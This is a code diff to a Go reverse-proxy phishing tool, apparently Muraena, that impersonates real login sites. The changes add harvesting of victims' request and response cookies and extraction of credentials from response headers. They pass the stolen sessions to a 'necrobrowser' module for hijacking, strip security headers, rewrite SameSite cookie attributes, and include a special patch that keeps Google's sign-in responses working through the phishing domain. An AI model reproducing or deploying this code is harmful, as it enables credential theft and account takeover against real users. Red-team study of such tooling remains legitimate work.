@@ -1,6 +1,7 @@
 package proxy
 
 import (
+	"bufio"
 	"bytes"
 	"encoding/json"
 	"fmt"
@@ -128,18 +129,10 @@ func (muraena *MuraenaProxy) RequestProcessor(request *http.Request) (err error)
 	// TRACKING
 	track := muraena.Tracker.TrackRequest(request)
 
-	// DROP
-	for _, drop := range sess.Config.Drop {
-		if request.URL.Path == drop.Path {
-			log.Debug("[Dropped] %s", request.URL.Path)
-			return
-		}
+	// If specified in the configuration, set the User-Agent header
+	if sess.Config.Transform.Request.UserAgent != "" {
+		request.Header.Set("User-Agent", sess.Config.Transform.Request.UserAgent)
 	}
-
-	//
-	// Garbage ..
-	//
-	// no garbage to remove in requests, for now ..
 
 	//
 	// HEADERS
@@ -181,13 +174,55 @@ func (muraena *MuraenaProxy) RequestProcessor(request *http.Request) (err error)
 		}
 	}
 
+	// Track request cookies (if enabled)
+	if muraena.Session.Config.Tracking.TrackRequestCookies && track.IsValid() {
+		if len(request.Cookies()) > 0 {
+			// get victim:
+			victim, err := muraena.Tracker.GetVictim(track)
+			if err != nil {
+				log.Warning("%s", err)
+			} else {
+				// store cookies in the Victim object
+				for _, c := range request.Cookies() {
+					if c.Domain == "" {
+						c.Domain = request.Host
+					}
+
+					// remove any port from the cookie domain
+					c.Domain = strings.Split(c.Domain, ":")[0]
+
+					// make the cookie domain wildcard
+					subdomains := strings.Split(c.Domain, ".")
+					if len(subdomains) > 2 {
+						c.Domain = fmt.Sprintf("%s", strings.Join(subdomains[1:], "."))
+					} else {
+						c.Domain = fmt.Sprintf("%s", c.Domain)
+					}
+
+					sessCookie := db.VictimCookie{
+						Name:     c.Name,
+						Value:    c.Value,
+						Domain:   c.Domain,
+						Path:     "/",
+						HTTPOnly: false,
+						Secure:   true,
+						Session:  true,
+						SameSite: "None",
+						Expires:  "2040-01-01 00:00:00 +0000 UTC",
+					}
+					muraena.Tracker.PushCookie(victim, sessCookie)
+				}
+			}
+		}
+	}
+
 	// Add extra HTTP headers
-	for _, header := range sess.Config.Craft.Add.Request.Headers {
+	for _, header := range sess.Config.Transform.Request.Add.Headers {
 		request.Header.Set(header.Name, header.Value)
 	}
 
 	// Log line
-	lhead := fmt.Sprintf("[%s]", getSenderIP(request))
+	lhead := fmt.Sprintf("[%s]", GetSenderIP(request))
 	if sess.Config.Tracking.Enabled {
 		lhead = fmt.Sprintf("[%*s]%s", track.TrackerLength, track.ID, lhead)
 	}
@@ -195,7 +230,7 @@ func (muraena *MuraenaProxy) RequestProcessor(request *http.Request) (err error)
 	l := fmt.Sprintf("%s [%s][%s%s%s]",
 		lhead,
 		Magenta(request.Method),
-		Magenta(sess.Config.Protocol), Yellow(request.Host), Cyan(request.URL.Path))
+		Magenta(sess.Config.Proxy.Protocol), Yellow(request.Host), Cyan(request.URL.Path))
 
 	if track.IsValid() {
 		log.Debug(l)
@@ -204,7 +239,7 @@ func (muraena *MuraenaProxy) RequestProcessor(request *http.Request) (err error)
 	}
 
 	// Remove headers
-	for _, header := range sess.Config.Remove.Request.Headers {
+	for _, header := range sess.Config.Transform.Request.Remove.Headers {
 		request.Header.Del(header)
 	}
 
@@ -213,7 +248,7 @@ func (muraena *MuraenaProxy) RequestProcessor(request *http.Request) (err error)
 	//
 
 	// If the requested resource extension is no relevant, skip body processing.
-	for _, extension := range sess.Config.SkipExtensions {
+	for _, extension := range sess.Config.Transform.Request.SkipExtensions {
 		if strings.HasSuffix(request.URL.Path, fmt.Sprintf(".%s", extension)) {
 			return
 		}
@@ -237,14 +272,14 @@ func (muraena *MuraenaProxy) RequestProcessor(request *http.Request) (err error)
 	return nil
 }
 
-// getSenderIP returns the IP address of the client that sent the request.
+// GetSenderIP returns the IP address of the client that sent the request.
 // It checks the following headers in cascade order:
 // - True-Client-IP
 // - CF-Connecting-IP
 // - X-Forwarded-For
 // If none of the headers contain a valid IP, it falls back to RemoteAddr.
 // TODO Update Watchdog to use this function
-func getSenderIP(req *http.Request) string {
+func GetSenderIP(req *http.Request) string {
 	// Define the headers to check in cascade order
 	headerNames := []string{"True-Client-IP", "CF-Connecting-IP", "X-Forwarded-For"}
 
@@ -259,7 +294,7 @@ func getSenderIP(req *http.Request) string {
 		}
 	}
 
-	log.Debug("Sender IP not found in headers, falling back to RemoteAddr")
+	log.Verbose("Sender IP not found in headers, falling back to RemoteAddr")
 
 	// If none of the headers contain a valid IP, fall back to RemoteAddr
 	ipPort := req.RemoteAddr
@@ -277,14 +312,14 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 		sess.Config.Transform.Base64.Padding,
 	}
 
-	if response.Request.Header.Get(muraena.Tracker.Landing) != "" {
+	if response.Request.Header.Get(muraena.Tracker.LandingHeader) != "" {
 		response.StatusCode = 302
 		response.Header.Add(muraena.Tracker.Header, response.Request.Header.Get(muraena.Tracker.Header))
 		response.Header.Add("Set-Cookie",
 			fmt.Sprintf("%s=%s; Domain=%s; Path=/; Expires=Wed, 30 Aug 2029 00:00:00 GMT",
-				muraena.Session.Config.Tracking.Identifier, response.Request.Header.Get(muraena.Tracker.Header),
+				muraena.Session.Config.Tracking.Trace.Identifier, response.Request.Header.Get(muraena.Tracker.Header),
 				muraena.Session.Config.Proxy.Phishing))
-		response.Header.Set("Location", response.Request.Header.Get(muraena.Tracker.Landing))
+		response.Header.Set("Location", response.Request.Header.Get(muraena.Tracker.LandingHeader))
 		return
 	}
 
@@ -296,113 +331,60 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 	//
 
 	// DROP
-	dropRequest := false
-	for _, drop := range sess.Config.Drop {
-		if response.Request.URL.Path == drop.Path && drop.RedirectTo != "" {
-			// if the response was for the dropped request
-			response.StatusCode = 302
-			response.Header.Set("Location", drop.RedirectTo)
-			log.Info("Dropped request %s redirected to: %s", drop.Path, drop.RedirectTo)
-			dropRequest = true
-			break
-		}
-	}
-	if dropRequest {
-		return
-	}
+	// dropRequest := false
+	//
+	// TODO: is this still needed? We redirect Requests in the RequestProcessor
+	// for _, drop := range sess.Config.Redirects {
+	//
+	// 	if drop.RedirectTo == "" {
+	// 		continue
+	// 	}
+	//
+	// 	// if the drop is empty, it means that we want to drop all the requests
+	// 	// and we don't want to redirect them
+	// 	if drop.Hostname == "" && drop.Path == "" && drop.Query == "" {
+	// 		continue
+	// 	}
+	//
+	// 	if drop.Hostname != "" && response.Request.Host != drop.Hostname {
+	// 		continue
+	// 	}
+	//
+	// 	if drop.Path != "" && response.Request.URL.Path != drop.Path {
+	// 		continue
+	// 	}
+	//
+	// 	if drop.Query != "" && response.Request.URL.RawQuery != drop.Query {
+	// 		continue
+	// 	}
+	//
+	// 	// Invalid HTTP code fallback to 302
+	// 	if drop.HTTPStatusCode == 0 {
+	// 		drop.HTTPStatusCode = 302
+	// 	}
+	//
+	// 	response.StatusCode = drop.HTTPStatusCode
+	// 	response.Header.Set("Location", drop.RedirectTo)
+	// 	log.Info("Dropped request %s redirected to: %s", drop.Path, drop.RedirectTo)
+	// 	// dropRequest = true
+	// 	// break
+	// 	return
+	// }
+
+	// if dropRequest {
+	// 	return
+	// }
 
 	// Add extra HTTP headers
-	for _, header := range sess.Config.Craft.Add.Response.Headers {
+	for _, header := range sess.Config.Transform.Response.Add.Headers {
 		response.Header.Set(header.Name, header.Value)
-	}
-
-	// Media Type handling.
-	// Prevent processing of unwanted media types
-	mediaType := strings.ToLower(response.Header.Get("Content-Type"))
-	for _, skip := range sess.Config.Transform.SkipContentType {
-
-		skip = strings.ToLower(skip)
-
-		if mediaType == skip {
-			return
-		}
-
-		if strings.HasSuffix(skip, "/*") &&
-			strings.Split(mediaType, "/")[0] == strings.Split(skip, "/*")[0] {
-			return
-		}
-	}
-
-	//
-	// Trace
-	//
-	victim := muraena.Tracker.TrackResponse(response)
-	if victim != nil {
-		// before transforming headers like cookies, store the cookies in the CookieJar
-		for _, c := range response.Cookies() {
-			if c.Domain == "" {
-				c.Domain = response.Request.Host
-			}
-
-			sessCookie := db.VictimCookie{
-				Name:     c.Name,
-				Value:    c.Value,
-				Domain:   c.Domain,
-				Expires:  c.Expires.String(), // will be set by necrobrowser
-				Path:     c.Path,
-				HTTPOnly: c.HttpOnly,
-				Secure:   c.Secure,
-			}
-
-			muraena.Tracker.PushCookie(victim, sessCookie)
-		}
-
-		if muraena.Session.Config.Tracking.Enabled && muraena.Session.Config.NecroBrowser.Enabled {
-			m, err := muraena.Session.Module("necrobrowser")
-			if err != nil {
-				log.Error("%s", err)
-			} else {
-				nb, ok := m.(*necrobrowser.Necrobrowser)
-				if ok {
-
-					getSession := false
-					for _, c := range muraena.Session.Config.Tracking.Urls.AuthSessionResponse {
-						if response.Request.URL.Path == c {
-							//log.Debug("Going to hijack response: %s (Victim: %+v)", response.Request.URL.Path, victim.ID)
-							getSession = true
-							break
-						}
-					}
-
-					if getSession {
-						// Pass credentials
-						creds, err := json.MarshalIndent(victim.Credentials, "", "\t")
-						if err != nil {
-							log.Warning(err.Error())
-						} else {
-							err := victim.GetVictimCookiejar()
-							if err != nil {
-								log.Error(err.Error())
-							} else {
-								go nb.Instrument(victim.ID, victim.Cookies, string(creds))
-							}
-						}
-					}
-				}
-			}
-		}
-
-	} else {
-		if len(response.Cookies()) > 0 {
-			log.Verbose("[TODO] Missing cookies to track: \n%s\n%+v", response.Request.URL, response.Cookies())
-		}
 	}
 
 	//
 	// HEADERS
 	//
 	// delete security headers
-	for _, header := range sess.Config.Remove.Response.Headers {
+	for _, header := range sess.Config.Transform.Response.Remove.Headers {
 		response.Header.Del(header)
 	}
 
@@ -423,12 +405,155 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 						response.Header["Set-Cookie"][k] = strings.Replace(response.Header["Set-Cookie"][k], domain, newDomain, 1)
 					}
 
-					log.Debug("Set-Cookie: %s", response.Header["Set-Cookie"][k])
+					// Further, if the SameSite attribute is set in the configuration, we need to patch the cookie
+					if sess.Config.Transform.Response.Cookie.SameSite != "" {
+						cookie := response.Header["Set-Cookie"][k]
+
+						// if cookie contains SameSite (case insensitive)
+						samesite := ""
+						if strings.Contains(strings.ToLower(cookie), "samesite") {
+							samesite = strings.Split(cookie, "SameSite=")[1]
+							samesite = strings.Split(samesite, ";")[0]
+						}
+
+						if samesite != "" {
+							cookie = strings.Replace(cookie, samesite, sess.Config.Transform.Response.Cookie.SameSite, 1)
+						} else {
+							cookie = cookie + ";SameSite=" + sess.Config.Transform.Response.Cookie.SameSite
+						}
+
+						response.Header["Set-Cookie"][k] = cookie
+					}
+
+					log.Verbose("Set-Cookie: %s", response.Header["Set-Cookie"][k])
 				}
+			} else if header == "Location" {
+				// TODO: Cleanup this mess
+
+				//
+				// if len(replacer.SubdomainMap) > 0 {
+				//	for _, m := range replacer.SubdomainMap {
+				//		if strings.Contains(response.Header.Get(header), m[1]) {
+				//			// replace only the first occurrence starting from the left
+				//			response.Header.Set(header, strings.Replace(response.Header.Get(header), m[1], m[0], -1))
+				//			break
+				//		}
+				//	}
+				// }
+
+				response.Header.Set(header, replacer.Transform(response.Header.Get(header), false, base64))
+
 			} else {
 				response.Header.Set(header, replacer.Transform(response.Header.Get(header), false, base64))
 			}
 		}
+	}
+
+	// Media LandingType handling.
+	// Prevent processing of unwanted media types
+	mediaType := strings.ToLower(response.Header.Get("Content-Type"))
+	for _, skip := range sess.Config.Transform.Response.SkipContentType {
+		skip = strings.ToLower(skip)
+
+		if mediaType == skip {
+			return
+		}
+
+		if strings.HasSuffix(skip, "/*") &&
+			strings.Split(mediaType, "/")[0] == strings.Split(skip, "/*")[0] {
+			return
+		}
+	}
+
+	//
+	// Trace
+	//
+	if muraena.Session.Config.Tracking.Enabled {
+		trace := muraena.Tracker.TrackResponse(response)
+		if trace.IsValid() {
+
+			var err error
+			victim, err := muraena.Tracker.GetVictim(trace)
+			if err != nil {
+				log.Warning("Error: cannot retrieve Victim from tracker: %s", err)
+			}
+
+			// victim := muraena.Tracker.TrackResponse(response)
+			if victim != nil {
+				// before transforming headers like cookies, store the cookies in the CookieJar
+				for _, c := range response.Cookies() {
+					if c.Domain == "" {
+						c.Domain = response.Request.Host
+					}
+
+					c.Domain = strings.Replace(c.Domain, ":443", "", -1)
+
+					sessCookie := db.VictimCookie{
+						Name:     c.Name,
+						Value:    c.Value,
+						Domain:   c.Domain,
+						Expires:  c.Expires.String(), // will be set by necrobrowser
+						Path:     c.Path,
+						HTTPOnly: c.HttpOnly,
+						Secure:   c.Secure,
+					}
+
+					muraena.Tracker.PushCookie(victim, sessCookie)
+				}
+
+				// Trace credentials
+				found, err := trace.ExtractCredentialsFromResponseHeaders(response)
+				if err != nil {
+					return errors.New(fmt.Sprintf("ExtractCredentialsFromResponseHeaders error: %s", err))
+				}
+
+				if found == true {
+					// muraena.Tracker.ShowVictims()
+				}
+
+				if muraena.Session.Config.Necrobrowser.Enabled {
+					m, err := muraena.Session.Module("necrobrowser")
+					if err != nil {
+						log.Error("%s", err)
+					} else {
+						nb, ok := m.(*necrobrowser.Necrobrowser)
+						if ok {
+
+							getSession := false
+							for _, c := range muraena.Session.Config.Necrobrowser.SensitiveLocations.AuthSessionResponse {
+								if response.Request.URL.Path == c {
+									// log.Debug("Going to hijack response: %s (Victim: %+v)", response.Request.URL.Path, victim.ID)
+									getSession = true
+									break
+								}
+							}
+
+							if getSession {
+								// Pass credentials
+								creds, err := json.MarshalIndent(victim.Credentials, "", "\t")
+								if err != nil {
+									log.Warning(err.Error())
+								} else {
+									err := victim.GetVictimCookiejar()
+									if err != nil {
+										log.Error(err.Error())
+									} else {
+										go nb.Instrument(victim.ID, victim.Cookies, string(creds))
+									}
+								}
+							}
+						}
+					}
+				}
+
+			} else {
+				if len(response.Cookies()) > 0 {
+					log.Verbose("[TODO] Missing cookies to track: \n%s\n%+v", response.Request.URL, response.Cookies())
+				}
+			}
+
+		}
+
 	}
 
 	//
@@ -444,12 +569,32 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 
 	// process body and pack again
 	newBody := replacer.Transform(string(responseBuffer), false, base64)
+
+	//
+	// Ugly Google patch
+	//
+	// If request URL contains: AccountsSignInUi/data/batchexecute
+	// the go for another round of patches
+	if strings.Contains(response.Request.URL.Path, "AccountsSignInUi/data/batchexecute") {
+
+		// if body contains the phishing domain
+		if strings.Contains(newBody, muraena.Session.Config.Proxy.Phishing) {
+			// if body contains )]}'\n\n then patch it
+			if strings.HasPrefix(newBody, ")]}'\n\n") {
+
+				// fmt.Println("newBody: ", newBody)
+				newBody = patchGoogleStructs(newBody)
+				// fmt.Println("updated newBody: ", newBody)
+
+			}
+		}
+	}
+
 	err = modResponse.Encode([]byte(newBody))
 	if err != nil {
 		log.Info("Error processing the body: %+v", err)
 		return err
 	}
-
 	return nil
 }
 
@@ -487,10 +632,25 @@ func (init *MuraenaProxyInit) Spawn() *MuraenaProxy {
 
 	director := proxy.Director
 	proxy.Director = func(r *http.Request) {
+
+		// If request matches the redirect list, redirect it without processing
+		if redirect := muraena.getHTTPRedirect(r); redirect != nil {
+			// Retrieve the http.ResponseWriter from the context
+			if rw, ok := r.Context().Value(0).(http.ResponseWriter); ok {
+				http.Redirect(rw, r, redirect.RedirectTo, redirect.HTTPStatusCode)
+			} else {
+				log.Error("Failed to retrieve the http.ResponseWriter from the context")
+			}
+
+			return
+		}
+
 		if err = muraena.RequestProcessor(r); err != nil {
 			log.Error(err.Error())
 			return
 		}
+
+		// Send the request to the target
 		director(r)
 	}
 	proxy.ModifyResponse = muraena.ResponseProcessor
@@ -510,6 +670,37 @@ func (init *MuraenaProxyInit) Spawn() *MuraenaProxy {
 	return muraena
 }
 
+func (muraena *MuraenaProxy) getHTTPRedirect(request *http.Request) *session.Redirect {
+
+	for _, drop := range muraena.Session.Config.Redirects {
+		// Skip if Hostname is set and the request Hostname is different from the expected one
+		if drop.Hostname != "" && request.Host != drop.Hostname {
+			continue
+		}
+
+		// Skip if Path is set and the request Path is different from the expected one
+		if drop.Path != "" && request.URL.Path != drop.Path {
+			continue
+		}
+
+		// Skip if Query is set and the request Query is different from the expected one
+		if drop.Query != "" && request.URL.RawQuery != drop.Query {
+			continue
+		}
+
+		log.Info("[Dropped] %s", request.URL.String())
+
+		// Invalid HTTP code fallback to 302
+		if drop.HTTPStatusCode == 0 {
+			drop.HTTPStatusCode = 302
+		}
+
+		return &drop
+	}
+
+	return nil
+}
+
 func (st SessionType) HandleFood(response http.ResponseWriter, request *http.Request) {
 	var destination string
 
@@ -521,21 +712,34 @@ func (st SessionType) HandleFood(response http.ResponseWriter, request *http.Req
 
 		ss, ok := m.(*statichttp.StaticHTTP)
 		if ok {
-			destination = ss.MakeDestinationURL(request.URL)
+			destination = ss.GetNewDestination(request.URL)
 		}
 	}
 
 	if destination == "" {
+
+		// CustomContent Subdomain Mapping
+		subs := strings.Split(request.Host, st.Replacer.Phishing)
+		if len(subs) > 1 {
+			sub := strings.Replace(subs[0], ".", "", -1)
+			for _, m := range st.Session.Config.Origins.SubdomainMap {
+				if m[0] == sub {
+					request.Host = fmt.Sprintf("%s.%s", m[1], st.Replacer.Phishing)
+					break
+				}
+			}
+		}
+
 		if strings.Contains(request.Host, st.Replacer.getCustomWildCardSeparator()) {
 			request.Host = st.Replacer.PatchComposedWildcardURL(request.Host)
 		}
 
-		if strings.HasPrefix(request.Host, st.Replacer.ExternalOriginPrefix) { //external domain mapping
+		if strings.HasPrefix(request.Host, st.Replacer.ExternalOriginPrefix) { // external domain mapping
 			for domain, subMapping := range st.Replacer.GetOrigins() {
 				// even if the resource is aa.bb.cc.dom.tld, the mapping is always one level as in www--2.phishing.tld.
 				// This is important since wildcard SSL certs do not handle N levels of nesting
 				if subMapping == strings.Split(request.Host, ".")[0] {
-					destination = fmt.Sprintf("%s%s", st.Session.Config.Protocol,
+					destination = fmt.Sprintf("%s%s", st.Session.Config.Proxy.Protocol,
 						strings.Replace(request.Host,
 							fmt.Sprintf("%s.%s", subMapping, st.Replacer.Phishing),
 							domain, -1))
@@ -543,7 +747,7 @@ func (st SessionType) HandleFood(response http.ResponseWriter, request *http.Req
 				}
 			}
 		} else {
-			destination = fmt.Sprintf("%s%s", st.Session.Config.Protocol,
+			destination = fmt.Sprintf("%s%s", st.Session.Config.Proxy.Protocol,
 				strings.Replace(request.Host, st.Replacer.Phishing, st.Replacer.Target, -1))
 		}
 	}
@@ -593,4 +797,48 @@ func (st SessionType) HandleFood(response http.ResponseWriter, request *http.Req
 	// Therefore, the actual version of reverseproxy.go used in this project
 	// has been slightly modified in the ServeHTTP method:
 	muraenaProxy.ReverseProxy.ServeHTTP(response, request)
+}
+
+// patchGoogleStructs is a temporary workaround for the Google Structs issue.
+func patchGoogleStructs(input string) string {
+	var builder strings.Builder
+
+	// Splitting the input into sections and processing
+	scanner := bufio.NewScanner(strings.NewReader(input))
+	for scanner.Scan() {
+		line := scanner.Text()
+
+		// Check if the line is a number (size indicator)
+		if size, err := strconv.Atoi(line); err == nil {
+			// Read the next line (message content)
+			if scanner.Scan() {
+				message := scanner.Text()
+
+				// Calculate the new size including the newline characters
+				newSize := len(message) + 2 // +2 for the two newline characters
+
+				// Update the size if it's different
+				if newSize != size+1 {
+					fmt.Fprintln(&builder, newSize)
+				} else {
+					fmt.Fprintln(&builder, size)
+				}
+
+				// Print the message content
+				fmt.Fprintln(&builder, message)
+			} else {
+				// fmt.Fprintln(&builder, "Error: Expected message content after size indicator.")
+				return builder.String()
+			}
+		} else {
+			// Print non-size indicator lines as is
+			fmt.Fprintln(&builder, line)
+		}
+	}
+
+	if err := scanner.Err(); err != nil {
+		fmt.Fprintln(&builder, "Error reading input:", err)
+	}
+
+	return builder.String()
 }
